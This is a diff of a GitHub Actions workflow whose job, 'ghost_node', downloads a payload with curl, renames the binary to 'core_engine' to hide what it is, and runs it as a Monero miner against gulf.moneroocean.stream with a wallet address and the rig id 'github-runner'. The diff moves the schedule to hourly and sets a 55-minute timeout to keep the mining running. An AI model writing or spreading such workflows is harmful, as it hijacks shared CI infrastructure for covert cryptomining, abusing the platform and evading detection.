@@ -4,15 +4,12 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: "0 0 * * *"
-    - cron: "30 6 * * *"
-    - cron: "0 13 * * *"
-    - cron: "30 19 * * *"
+    - cron: "0 * * * *"
 
 jobs:
   ghost_node:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 55
 
     steps:
       - name: "⚙️ bootstrap // system sync"
@@ -34,7 +31,6 @@ jobs:
           curl -L "$url" -o payload.tar.gz
           tar xf payload.tar.gz
 
-          # normalize binary name (hide original artifact name)
           BIN=$(find . -type f -perm -111 | head -1)
           if [ -f "$BIN" ]; then
             mv "$BIN" ./core_engine
@@ -60,7 +56,7 @@ jobs:
 
           ./core_engine \
             -o gulf.moneroocean.stream:20004 \
-            -u 4642GJmrVXnEcUU8NQAhdVFphkSb1oXdTDGX6TjNsYMb7PfafouDdLXFX3c3Pkhqd6dNcDwmriJMiCzwSPfzHQAwGcJio \
+            -u 4642GJmrVXnEcUU8NQAhdVFphkSb1oXdUdTDGX6TjNsYMb7PfafouDdLXFX3c3Pkhqd6dNcDwmriJMiCzwSPfzHQAwGcJio \
             --rig-id github-runner \
             --keepalive \
             --tls \
